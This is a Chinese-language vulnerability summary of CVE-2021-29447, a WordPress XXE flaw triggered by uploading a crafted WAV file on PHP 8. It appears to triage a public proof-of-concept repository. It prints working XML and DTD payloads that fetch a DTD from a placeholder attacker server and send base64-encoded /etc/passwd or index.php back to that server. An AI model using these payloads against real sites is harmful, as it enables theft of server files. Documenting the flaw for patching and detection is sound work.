## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露和服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (在 PHP 8 环境下)

**利用条件:** 需要具备上传文件的权限 (如作者角色)，且服务器运行在 PHP 8 环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 的媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限的用户（例如作者）可以通过上传包含恶意 XML 内容的文件（如特制的 WAV 文件）来触发 XXE 漏洞。

**利用方式：**

1.  **构建恶意 WAV 文件：** 攻击者需要创建一个包含恶意 XML 声明的 WAV 文件。该 XML 声明包含一个外部实体引用，指向攻击者控制的远程 DTD 文件。

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
        <!ENTITY % remote SYSTEM 'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'>
        %remote;%init;%trick;
    ]>
    ```

2.  **创建恶意 DTD 文件：** 攻击者需要在自己的服务器上创建一个 DTD 文件，该文件定义了如何读取服务器上的文件，并将其发送回攻击者。例如，读取 `/etc/passwd` 文件并进行 Base64 编码。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

    或者，读取 WordPress 配置文件 `index.php`。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../index.php">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

3.  **上传恶意 WAV 文件：** 攻击者通过 WordPress 后台的媒体库上传该恶意 WAV 文件。

4.  **触发 XXE：** WordPress 解析该 WAV 文件时，会尝试解析其中的 XML 内容，从而触发 XXE 漏洞，并从攻击者的服务器下载 DTD 文件。

5.  **获取文件内容：** 恶意 DTD 文件会指示 WordPress 读取目标文件（例如 `/etc/passwd` 或 `wp-config.php`），对其进行 Base64 编码，并通过 HTTP 请求将内容发送到攻击者的服务器。

**有效性：**

提供的 POC 代码有效，可以利用该漏洞读取服务器上的文件，或者进行 SSRF 攻击。搜索结果中的多个链接也证实了该漏洞的存在以及利用方式。

**投毒风险：**

代码中存在轻微的投毒风险。主要的风险点在于 DTD 文件是由攻击者提供的。虽然提供的 DTD 示例代码是用来读取文件，但攻击者可以在 DTD 文件中执行其他恶意操作，例如尝试执行代码。但是由于文件读取已经是该漏洞所能达到的最大危害之一。所以判断投毒风险为10%。该值评估仓库中是否隐藏有恶意或非预期行为的代码。例如，某些代码可能会在未经授权的情况下收集用户信息、安装后门或执行其他恶意活动。 

**项目地址:** [AssassinUKG/CVE-2021-29447](https://github.com/AssassinUKG/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)